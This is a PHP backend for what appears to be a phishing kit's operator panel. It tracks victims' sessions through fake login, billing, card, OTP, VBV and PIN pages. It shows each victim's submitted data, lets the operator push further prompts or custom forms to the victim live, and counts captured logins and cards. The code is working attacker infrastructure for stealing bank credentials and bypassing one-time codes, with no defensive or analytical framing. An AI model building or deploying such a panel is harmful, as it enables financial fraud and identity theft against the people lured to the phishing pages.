<?php
session_name('panel_sess');
session_start();
header('Content-Type: application/json');

$PASSWORD = 'changeme';
$DATA = __DIR__ . '/data/sessions';
$ARCHIVE = __DIR__ . '/data/archive';

if (!is_dir($DATA)) @mkdir($DATA, 0777, true);
if (!is_dir($ARCHIVE)) @mkdir($ARCHIVE, 0777, true);

$action = $_GET['a'] ?? '';

if ($action === 'login') {
    $pw = $_POST['password'] ?? '';
    if ($pw === $PASSWORD) {
        $_SESSION['panel_auth'] = true;
        die(json_encode(['ok' => true]));
    }
    http_response_code(401);
    die(json_encode(['error' => 'wrong']));
}

if ($action === 'logout') {
    unset($_SESSION['panel_auth']);
    die(json_encode(['ok' => true]));
}

if (empty($_SESSION['panel_auth'])) {
    http_response_code(401);
    die(json_encode(['error' => 'auth']));
}

function loadDir($dir) {
    $r = [];
    if (!is_dir($dir)) return $r;
    foreach (glob($dir . '/*.json') as $f) {
        $d = json_decode(file_get_contents($f), true);
        if ($d) $r[] = $d;
    }
    usort($r, fn($a, $b) => ($b['updated_at'] ?? 0) - ($a['updated_at'] ?? 0));
    return $r;
}

function findSession($id) {
    global $DATA, $ARCHIVE;
    $f = $DATA . '/' . $id . '.json';
    if (!file_exists($f)) $f = $ARCHIVE . '/' . $id . '.json';
    if (!file_exists($f)) return null;
    return json_decode(file_get_contents($f), true);
}

function saveSession($s) {
    global $DATA, $ARCHIVE;
    $dir = ($s['status'] ?? '') === 'finished' ? $ARCHIVE : $DATA;
    file_put_contents($dir . '/' . $s['id'] . '.json', json_encode($s, JSON_PRETTY_PRINT), LOCK_EX);
}

$stale = time() - 10;

function enrichSession($s) {
    global $stale;
    if (($s['updated_at'] ?? 0) < $stale) $s['is_online'] = false;
    $s['os'] = detectOS($s['user_agent'] ?? '');
    $s['stepLabel'] = stepLabel($s['current_step'] ?? 'visit');
    return $s;
}

function detectOS($ua) {
    $ua = strtolower($ua);
    if (strpos($ua, 'iphone') !== false || strpos($ua, 'ipad') !== false || strpos($ua, 'macintosh') !== false) return 'apple';
    if (strpos($ua, 'android') !== false) return 'android';
    if (strpos($ua, 'windows') !== false) return 'windows';
    if (strpos($ua, 'linux') !== false) return 'linux';
    return 'other';
}

function stepLabel($s) {
    $m = ['visit'=>'Visite','login'=>'Login','info'=>'Information','information'=>'Information',
        'billing'=>'Billing','card'=>'Card','loading'=>'Loading','page_loading'=>'Loading',
        'page_otp_sms'=>'OTP SMS','page_otp_mail'=>'OTP Mail','page_otp_nfc'=>'OTP NFC',
        'page_vbv'=>'VBV','page_pin'=>'PIN','page_custom'=>'Custom',
        'sms'=>'OTP SMS','mail'=>'OTP Mail','nfc'=>'OTP NFC','vbv'=>'VBV',
        'vbv_confirmed'=>'VBV OK','pin'=>'PIN','custom'=>'Custom','finished'=>'Termine'];
    return $m[$s] ?? ucfirst(str_replace(['page_','_'], ['', ' '], $s));
}

switch ($action) {
    case 'sessions':
        $sessions = loadDir($DATA);
        $out = [];
        foreach ($sessions as $s) $out[] = enrichSession($s);
        usort($out, function($a, $b) {
            $aW = in_array($a['current_step'] ?? '', ['loading', 'page_loading']) ? 1 : 0;
            $bW = in_array($b['current_step'] ?? '', ['loading', 'page_loading']) ? 1 : 0;
            if ($aW !== $bW) return $bW - $aW;
            return ($b['updated_at'] ?? 0) - ($a['updated_at'] ?? 0);
        });
        die(json_encode($out));

    case 'session':
        $id = $_GET['id'] ?? '';
        $s = findSession($id);
        if (!$s) { http_response_code(404); die(json_encode(['error' => 'not found'])); }
        $s = enrichSession($s);
        $tl = [];
        foreach ($s['steps'] ?? [] as $st) $tl[] = ['at' => $st['at'], 'type' => 'step', 'label' => stepLabel($st['step']), 'by' => ''];
        foreach ($s['actions'] ?? [] as $a) $tl[] = ['at' => $a['at'], 'type' => 'action', 'label' => ($a['type']??'').' — '.($a['detail']??''), 'by' => $a['by'] ?? ''];
        usort($tl, fn($a, $b) => $a['at'] - $b['at']);
        $s['timeline'] = $tl;
        $sub = [];
        foreach ($s['actions'] ?? [] as $a) {
            if (($a['by']??'') === 'victim' && !empty($a['detail']))
                $sub[] = ['type' => stepLabel($a['type']??''), 'detail' => $a['detail'], 'at' => $a['at']];
        }
        $s['submitted'] = $sub;
        die(json_encode($s));

    case 'stats':
        $f = $_GET['f'] ?? 'all';
        $since = null;
        $now = time();
        if ($f === '24h') $since = $now - 86400;
        elseif ($f === '7d') $since = $now - 604800;
        elseif ($f === '30d') $since = $now - 2592000;
        $all = array_merge(loadDir($DATA), loadDir($ARCHIVE));
        if ($since) $all = array_filter($all, fn($s) => ($s['created_at']??0) >= $since);
        $st = ['visitors'=>0,'logins'=>0,'billing'=>0,'cards'=>0,'complete'=>0];
        foreach ($all as $s) {
            $st['visitors']++;
            $steps = array_column($s['steps'] ?? [], 'step');
            if (in_array('login', $steps)) $st['logins']++;
            if (in_array('billing', $steps)) $st['billing']++;
            if (in_array('card', $steps)) $st['cards']++;
            if (($s['status']??'') === 'finished') $st['complete']++;
        }
        die(json_encode($st));

    case 'action':
        $id = $_POST['id'] ?? '';
        $type = $_POST['type'] ?? '';
        $s = findSession($id);
        if (!$s) { http_response_code(404); die(json_encode(['error' => 'not found'])); }
        $s['actions'][] = ['type' => $type, 'detail' => 'Sent '.$type, 'by' => 'operator', 'at' => time()];
        if ($type === 'custom') {
            $s['pending_action'] = 'custom';
            $s['pending_custom'] = [
                'title' => $_POST['title'] ?? '',
                'message' => $_POST['message'] ?? '',
                'fields' => json_decode($_POST['fields'] ?? '[]', true) ?: [['label'=>'','placeholder'=>'','type'=>'text']],
            ];
        } elseif ($type === 'ban') {
            $s['pending_action'] = 'banned';
            $s['status'] = 'banned';
        } else {
            $s['pending_action'] = $type;
        }
        saveSession($s);
        die(json_encode(['ok' => true]));

    case 'password':
        $cur = $_POST['current'] ?? '';
        $new = $_POST['new'] ?? '';
        if ($cur !== $PASSWORD) { http_response_code(400); die(json_encode(['error' => 'wrong'])); }
        $cfg = file_get_contents(__DIR__ . '/api.php');
        $cfg = preg_replace("/\\$PASSWORD\\s*=\\s*'[^']*'/", "\$PASSWORD = '" . addslashes($new) . "'", $cfg);
        file_put_contents(__DIR__ . '/api.php', $cfg);
        die(json_encode(['ok' => true]));

    default:
        http_response_code(400);
        die(json_encode(['error' => 'unknown action']));
}
